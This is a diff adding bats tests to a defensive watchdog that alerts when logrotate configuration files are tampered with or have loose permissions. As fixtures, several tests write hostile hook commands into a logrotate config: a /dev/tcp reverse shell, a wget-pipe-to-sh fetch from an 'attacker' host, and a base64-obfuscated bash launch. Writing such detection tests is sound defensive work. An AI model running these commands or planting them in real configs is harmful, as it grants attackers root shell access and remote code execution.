@@ -121,3 +121,60 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — logrotate inventory enumerates root-exec-on-rotation surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in postrotate → alert" {
+    seed_benign
+    run_wd
+    printf '/var/log/y.log {\n  postrotate\n    bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n  endscript\n}\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in prerotate → alert" {
+    seed_benign
+    run_wd
+    printf '/var/log/z.log {\n  prerotate\n    wget -qO- http://attacker/p | sh\n  endscript\n}\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe): obfuscation variant in firstaction → alert" {
+    seed_benign
+    run_wd
+    printf '/var/log/q.log {\n  firstaction\n    echo YmFzaCAtaQ== | base64 -d | bash\n  endscript\n}\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (group-writable logrotate conf): group-writable → alert above world-writable bar" {
+    seed_benign
+    run_wd
+    chmod 0664 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (pre-existing world-writable logrotate conf): baseline_initial fires alert at install-time" {
+    seed_benign
+    chmod 0666 "${CONF}"
+    run_wd
+    cap | grep -q '"event":"baseline_initial"'
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-logrotate -- ')
+    [ "${main_count}" = "1" ]
+}
